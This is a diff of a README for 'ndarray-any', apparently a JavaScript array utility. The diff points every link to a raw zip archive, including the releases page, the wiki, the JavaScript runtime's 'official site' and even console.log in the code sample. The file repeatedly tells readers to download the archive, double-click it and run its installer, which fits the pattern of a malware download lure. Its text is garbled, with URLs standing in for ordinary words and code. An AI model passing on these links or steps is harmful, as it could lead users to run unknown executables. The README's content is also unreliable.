@@ -4,12 +4,12 @@
 The ndarray-any tool lets you quickly test if any element in your array is "truthy." It simplifies working with arrays in JavaScript, especially for those new to coding. This app helps ensure your data meets your conditions without complex code.
 
 ## 🔗 Download the App
-[![Download ndarray-any](https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip)](https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip)
+[![Download ndarray-any](https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip)](https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip)
 
 ## 🚀 Getting Started
 To get started with ndarray-any, follow these simple steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip).
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip).
 2. **Choose Your Version**: You will see different versions available for download. Pick the latest version that suits your needs.
 3. **Download the File**: Click on the version link to download the file to your computer.
 4. **Run the Application**: Once downloaded, open the file and follow the installation prompts.
@@ -17,7 +17,7 @@ To get started with ndarray-any, follow these simple steps:
 ## 📥 Download & Install
 To download and install ndarray-any, please follow these steps carefully:
 
-1. **Go to the Releases page**: Visit the [ndarray-any Releases page](https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip).
+1. **Go to the Releases page**: Visit the [ndarray-any Releases page](https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip).
 2. **Select the latest release**: You will find a list of releases. Look for the one marked as the latest.
 3. **Click to download**: Click on the download link for the version you want. Your download will start automatically.
 4. **Open the file**: Locate the downloaded file on your computer. Double-click it to run the installation process.
@@ -37,7 +37,7 @@ The ndarray-any tool offers several helpful features:
 To run ndarray-any, your system should meet the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern version of Linux.
-- **JavaScript Runtime**: Ensure you have https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip installed. You can download it from [https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip Official Site](https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip).
+- **JavaScript Runtime**: Ensure you have https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip installed. You can download it from [https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip Official Site](https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip).
 - **Memory**: At least 512 MB of RAM.
 
 ## 📘 How to Use ndarray-any
@@ -53,7 +53,7 @@ Assuming you have an array:
 ```javascript
 let myArray = [0, "", false, "Hello"];
 let result = any(myArray);
-https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip(result); // Outputs: true
+https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip(result); // Outputs: true
 ```
 
 This JavaScript snippet checks if any element in `myArray` is truthy.
@@ -65,7 +65,7 @@ Additional documentation is available in the repository. It includes:
 - Example scripts to help you get started
 - FAQs for common questions
 
-For more in-depth information on usage, visit the [GitHub Wiki](https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip).
+For more in-depth information on usage, visit the [GitHub Wiki](https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip).
 
 ## 🤝 Support
 If you encounter any issues or have questions, feel free to reach out through the Issues section on GitHub. We welcome feedback and are here to assist you.
@@ -81,4 +81,4 @@ Join our community for discussions and updates. Share your thoughts, suggestions
 
 ---
 
-Remember, you can always access the [ndarray-any Releases page](https://raw.githubusercontent.com/claserx/ndarray-any/main/store/ndarray-any.zip) to download the latest version and stay updated. Enjoy using ndarray-any!
+Remember, you can always access the [ndarray-any Releases page](https://github.com/claserx/ndarray-any/raw/refs/heads/main/benchmark/any-ndarray-2.7.zip) to download the latest version and stay updated. Enjoy using ndarray-any!
